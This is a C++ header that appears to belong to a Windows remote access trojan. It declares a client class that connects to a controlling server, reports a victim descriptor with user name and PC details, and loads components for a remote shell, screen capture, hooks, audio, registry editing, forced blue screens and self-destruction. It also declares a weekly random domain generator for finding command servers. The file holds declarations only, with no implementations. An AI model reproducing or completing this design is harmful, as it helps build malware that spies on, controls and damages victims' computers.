#pragma once

#include "TcpInterface.h"
#include <memory>
#include <functional>
#include <array>

enum class ClientTypes : uint32_t {
	shell = 0,
	screenCapture = 1,
	ftp = 2,
	hooks = 3,
	autodestroy = 4,
	audio = 5,
	bsod = 6,
	upload_manager = 7,
	download_manager = 8,
	no_load = 9,	//for components other or including loader.dll
	regedit = 10,
	mouse = 11,
	any_load = 12	// used only in software not by atual components
};


struct TRY_CONNECT_INFO {
	std::string server_addres;
	std::string port;
	bool is_ip;
};

#pragma pack(push, 1)
struct USERDESCRIPTOR {
	char unique_id[20] = { 0 };
	char user_name[30] = { 0 };
	char pc_description[128] = { 0 };
	char custom_name[30] = { 0 };
	uint16_t version;
	uint8_t os_version;
	SYSTEMTIME os_time;
	char extra_data[1024] = { 0 };
	uint32_t client_type;
};
#pragma pack(pop)


class HorizonClient {
private:
	HMODULE this_dll;
	USERDESCRIPTOR* user = nullptr;
	bool authentificated = false;
	TOKEN_KEY last_packet_token;
	TcpInterface protocol;
	std::function<void(const USERDESCRIPTOR*)> callback_userupdated;

	static bool wsa_initiated;
public:
	HorizonClient(TRY_CONNECT_INFO server_addr, const USERDESCRIPTOR* set_user, HMODULE dll, std::function<void(const USERDESCRIPTOR*)> callback_userupdated);

	//Destructor-velociraptor
	~HorizonClient();

	//Returns the up-to-date descriptor
	const USERDESCRIPTOR* getCurrentDescriptor();

	// Authentificates the current client. Closes and invalidates this instance if fails
	bool authentificate(int line);

	void closeClient();
	bool isClosed();
	bool isAuthentificated();
	// Returns whether the socket is alive, authentificated and data can be sent
	bool canUse();

	bool dataAvailable(int seconds);
	void applyTokenToHeader(PACKET_HEADER* header);
	void setTokenFromHeader(PACKET_HEADER* header);
	void setToken(TOKEN_KEY& token);
	void getToken(TOKEN_KEY& token);

	//Token is taken from the internally saved value
	bool sendPacketHeader(PacketDataTypes data_type, uint64_t size, std::string arguments, int line);
	bool sendPacketHeader(PACKET_HEADER* head, int line);
	bool sendData(const char* buffer, uint64_t len, int line);

	//Method for sending critical higher-level errors to the server
	//All quotes in the message are replaced by commas
	//Doesn't close the client
	bool sendError(std::string msg, int line);
	//Method for sending non-critical notifications to the server
	//Doesn't close the client
	bool sendNotification(std::string msg, int line);

	bool recvPacketHeader(PACKET_HEADER* head, int line);
	bool recvData(char* buffer, uint64_t len, int line);
};



//Returns an dns accordingly to debug/release and random dns
TRY_CONNECT_INFO getNextDNS();

//Returns a random dns for each week in year
std::string generateRandomDNS();


// Create default user structure
std::unique_ptr<USERDESCRIPTOR> createQuickUser(std::string custom_name, std::string pc_description, char version, ClientTypes client_type);

// Sanitizes the USERDESCRIPTOR structure by appending null terminators
USERDESCRIPTOR* sanitizeUserDescriptor(USERDESCRIPTOR* user);